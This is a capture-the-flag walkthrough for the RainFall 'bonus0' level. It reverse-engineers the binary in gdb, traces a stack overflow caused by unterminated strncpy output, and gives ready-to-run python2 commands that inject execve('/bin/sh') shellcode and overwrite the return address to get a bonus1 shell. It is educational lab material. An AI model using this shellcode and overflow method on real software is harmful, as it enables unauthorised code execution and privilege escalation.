# Walkthrough

So, I was checking the files in my home directory and I found this binary file called `"bonus0"`. When I ran it, I noticed that it read input from the keyboard twice and then printed the concatenated strings of the input.

```sh
bonus0@RainFall:~$ ./bonus0 
 - 
AAAA
 - 
BBBB
AAAA BBBB
```

 To understand how it works, I used this `gdb` that lets me debug programs.  I looked at the `"main"` function of the program and I saw that it called `"pp"` function with a parameter. After `"pp"` returned, the `"main"` function used the `"puts"` function to print the value of the parameter.

 ```s
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>: push   ebp
   0x080485a5 <+1>: mov    ebp,esp
   0x080485a7 <+3>: and    esp,0xfffffff0
   0x080485aa <+6>: sub    esp,0x40
   0x080485ad <+9>: lea    eax,[esp+0x16]
   0x080485b1 <+13>: mov    DWORD PTR [esp],eax
   0x080485b4 <+16>: call   0x804851e <pp>
   0x080485b9 <+21>: lea    eax,[esp+0x16]
   0x080485bd <+25>: mov    DWORD PTR [esp],eax
   0x080485c0 <+28>: call   0x80483b0 <puts@plt>
   0x080485c5 <+33>: mov    eax,0x0
   0x080485ca <+38>: leave  
 ```

 I then looked at the `"pp"` function and I saw that it called this other function called `"p"` twice. The first time it called `"p"`, it passed a buffer address and the string `" - "` as arguments. The second time, it did the same thing but with a different buffer. After that, `"pp"` used the `"strcpy"` function to copy the first buffer to the first parameter that `"main"` passed to it. It added a space to that parameter and then concatenated the second buffer to it.

 ```c
(gdb) disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>: push   ebp
   0x0804851f <+1>: mov    ebp,esp
   0x08048521 <+3>: push   edi
   0x08048522 <+4>: push   ebx
   0x08048523 <+5>: sub    esp,0x50
   0x08048526 <+8>: mov    DWORD PTR [esp+0x4],0x80486a0 // 0x80486a0: " - "
   0x0804852e <+16>: lea    eax,[ebp-0x30] // first buffer
   0x08048531 <+19>: mov    DWORD PTR [esp],eax
   0x08048534 <+22>: call   0x80484b4 <p>
   0x08048539 <+27>: mov    DWORD PTR [esp+0x4],0x80486a0 // 0x80486a0: " - "
   0x08048541 <+35>: lea    eax,[ebp-0x1c] // second buffer
   0x08048544 <+38>: mov    DWORD PTR [esp],eax
   0x08048547 <+41>: call   0x80484b4 <p>
   0x0804854c <+46>: lea    eax,[ebp-0x30]
   0x0804854f <+49>: mov    DWORD PTR [esp+0x4],eax
   0x08048553 <+53>: mov    eax,DWORD PTR [ebp+0x8]
   0x08048556 <+56>: mov    DWORD PTR [esp],eax
   0x08048559 <+59>: call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>: mov    ebx,0x80486a4
   0x08048563 <+69>: mov    eax,DWORD PTR [ebp+0x8]
   0x08048566 <+72>: mov    DWORD PTR [ebp-0x3c],0xffffffff
   0x0804856d <+79>: mov    edx,eax
   0x0804856f <+81>: mov    eax,0x0
   0x08048574 <+86>: mov    ecx,DWORD PTR [ebp-0x3c]
   0x08048577 <+89>: mov    edi,edx
   0x08048579 <+91>: repnz scas al,BYTE PTR es:[edi]
   0x0804857b <+93>: mov    eax,ecx
   0x0804857d <+95>: not    eax
   0x0804857f <+97>: sub    eax,0x1
   0x08048582 <+100>: add    eax,DWORD PTR [ebp+0x8]
   0x08048585 <+103>: movzx  edx,WORD PTR [ebx]
   0x08048588 <+106>: mov    WORD PTR [eax],dx
   0x0804858b <+109>: lea    eax,[ebp-0x1c]
   0x0804858e <+112>: mov    DWORD PTR [esp+0x4],eax
   0x08048592 <+116>: mov    eax,DWORD PTR [ebp+0x8]
   0x08048595 <+119>: mov    DWORD PTR [esp],eax
   0x08048598 <+122>: call   0x8048390 <strcat@plt>
   0x0804859d <+127>: add    esp,0x50
   0x080485a0 <+130>: pop    ebx
   0x080485a1 <+131>: pop    edi
   0x080485a2 <+132>: pop    ebp
   0x080485a3 <+133>: ret  
 ```

 Lastly, `"p"` function printed a `dash`, read input from the keyboard, and stored the input content in a buffer. It then replaced the newline character with a null character and copied the input content from the buffer to the one passed by the `"pp"` function using the `"strncpy"` function, with a size of 20.

 ```s
(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>: push   ebp
   0x080484b5 <+1>: mov    ebp,esp
   0x080484b7 <+3>: sub    esp,0x1018
   0x080484bd <+9>: mov    eax,DWORD PTR [ebp+0xc]
   0x080484c0 <+12>: mov    DWORD PTR [esp],eax
   0x080484c3 <+15>: call   0x80483b0 <puts@plt>
   0x080484c8 <+20>: mov    DWORD PTR [esp+0x8],0x1000
   0x080484d0 <+28>: lea    eax,[ebp-0x1008]
   0x080484d6 <+34>: mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>: mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>: call   0x8048380 <read@plt>
   0x080484e6 <+50>: mov    DWORD PTR [esp+0x4],0xa
   0x080484ee <+58>: lea    eax,[ebp-0x1008]
   0x080484f4 <+64>: mov    DWORD PTR [esp],eax
   0x080484f7 <+67>: call   0x80483d0 <strchr@plt>
   0x080484fc <+72>: mov    BYTE PTR [eax],0x0
   0x080484ff <+75>: lea    eax,[ebp-0x1008]
   0x08048505 <+81>: mov    DWORD PTR [esp+0x8],0x14
   0x0804850d <+89>: mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+93>: mov    eax,DWORD PTR [ebp+0x8]
   0x08048514 <+96>: mov    DWORD PTR [esp],eax
   0x08048517 <+99>: call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>: leave  
   0x0804851d <+105>: ret 
 ```

Now, let me try the program with a different input and observe the output.

```
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
AAAABBBBCCCCDDDDEEEE
 - 
aaaabbbbccccddddeee
AAAABBBBCCCCDDDDEEEEaaaabbbbccccddddeee aaaabbbbccccddddeee

Program received signal SIGSEGV, Segmentation fault.
=> 0x65656464: Error while running hook_stop:
Cannot access memory at address 0x65656464
0x65656464 in ?? ()

```

So, when I tried running the program with a new input, I got this error called `"segmentation fault"` and I also noticed that the first string before the space character was being concatenated with the second input string. I did some investigating and found out that during the first time the program used the `"strcpy"` function in the `"pp"` function, it copied not only the first buffer but also the second buffer. I realized that this happened because of the `"strncpy"` function in the `"p"` function, which only copies `20 bytes` and doesn't add a null terminator if it doesn't find one in the first 20 bytes of the input. Since there was no null terminator after the first buffer, the `"strcpy"` function continued copying the second buffer as well, since it was located right after the first buffer.

Next, I'm going to calculate the offset before reaching the value `0x65656464` and replace it with the address of our shell code, which I'll include in the first input string. Since `65656464` is equivalent to `ddee`, we'll need an offset of 14 to get there.

I'm going to use Python to generate the first input string, which I'll enter into the program. This will also help me retrieve the address of the shell code.

```sh
python2 -c 'print("A" * 60 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")' > /tmp/flag
```

Now, I'm going to redirect the file containing the input string to the program's input. When I run the program with this input, I can see that the shell code starts at the address `0xbfffe5bc`.

```
(gdb) r < /tmp/flag
Starting program: /home/user/bonus0/bonus0 < /tmp/flag
------------ stack ------------
0xbfffe570: 0xbffff5b8 0xbfffe580 0x00000014 0x00000000
0xbfffe580: 0x41414141 0x41414141 0x41414141 0x41414141
0xbfffe590: 0x41414141 0x41414141 0x41414141 0x41414141
0xbfffe5a0: 0x41414141 0x41414141 0x41414141 0x41414141
0xbfffe5b0: 0x41414141 0x41414141 0x41414141 0xe1f7c931
0xbfffe5c0: 0x68510bb0 0x68732f2f 0x69622f68 0xcde3896e
0xbfffe5d0: 0x00000080 0x00000000 0x00000000 0x00000000
```

For the second input string, i'll use Python to generate another string that includes the address `(0xbfffe5bc)` in place of the `(ddee)`.

```sh
python2 -c 'print("B" * 14 + "\xbf\xff\xe5\xbc"[::-1]+ "C")' > /tmp/flag1
```

Finally, I'll use the strings I generated in the program:

```sh
bonus0@RainFall:~$ (cat /tmp/flag ; cat /tmp/flag1 -) | ./bonus0 
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBB����C BBBBBBBBBBBBBB����C
whoami
bonus1
cd ../bonus1
ls -la
total 17
dr-xr-x---+ 1 bonus1 bonus1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus1 bonus1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus1 bonus1 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 bonus1 bonus1   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus1 bonus1  675 Apr  3  2012 .profile
-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
```
